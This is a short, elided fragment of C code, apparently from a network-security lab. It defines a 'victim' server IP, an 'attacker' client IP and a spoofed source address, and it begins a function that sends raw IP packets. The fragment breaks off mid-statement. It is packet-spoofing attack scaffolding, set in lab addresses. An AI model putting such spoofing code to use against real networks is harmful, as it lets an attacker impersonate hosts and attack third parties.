...
// 
#define SERVER_IP "10.9.0.5" //victim
#define CLIENT_IP "10.9.0.1" //attacker
#define SERVER_PORT 9090
#define CLIENT_PORT 9091
#define SPOOF_IP "192.168.0.1" //actual client
...
void send_raw_ip_packet(ipheader *ip)
{
    ...
    if(sendto(sockfd, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) == -1){
